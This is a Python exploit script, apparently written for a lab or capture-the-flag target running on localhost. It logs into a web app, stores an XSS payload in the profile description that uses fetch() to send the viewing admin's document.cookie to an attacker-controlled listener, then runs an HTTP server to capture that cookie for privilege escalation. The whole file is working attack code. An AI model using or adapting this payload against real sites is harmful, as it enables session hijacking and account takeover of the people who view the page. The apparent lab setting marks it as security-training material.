from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import requests


class PrivilegeEscalation:
    def __init__(self, session=None, base_url="http://localhost:8000", lhost="host.docker.internal",
                 lport=8001, username="user1", password="hacked"):
        self.admin_cookie = None
        self.base_url = base_url
        self.lhost = lhost
        self.lport = lport
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self._login(username, password)

    def _login(self, username, password):
        data = {"username": username, "password": password}
        resp = self.session.post(f"{self.base_url}/login.php", data=data)
        return f"Hello, {username}!" in resp.text

    def _set_description(self, payload):
        data = {"description": payload}
        resp = self.session.post(f"{self.base_url}/profile.php", data=data)
        return resp.status_code == 200

    def _listen_for_cookie(self):
        escalation = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                params = parse_qs(urlparse(self.path).query)
                if "secret" in params:
                    escalation.admin_cookie = params["secret"][0]
                self.send_response(200)
                self.end_headers()

            def log_message(self, format, *args):
                pass

        server = HTTPServer(("0.0.0.0", self.lport), Handler)
        server.handle_request()

    def run(self):
        print("\nPrivilege Escalation Started")

        payload = f'<img src=x onerror="fetch(\'http://{self.lhost}:{self.lport}/?secret=\'+document.cookie)"/>'

        if not self._set_description(payload):
            print("Failed to set XSS payload.")
            return None

        print(f"[*] Set description to XSS payload")
        print(f"[*] Listening on {self.lhost}:{self.lport}...")
        print("[*] Waiting for admin to visit homepage...")

        self._listen_for_cookie()

        if self.admin_cookie:
            print(f"[*] Got admin cookie: {self.admin_cookie}")
            return self.admin_cookie
        else:
            print("Failed to capture admin cookie.")
            return None


if __name__ == "__main__":
    PrivilegeEscalation().run()
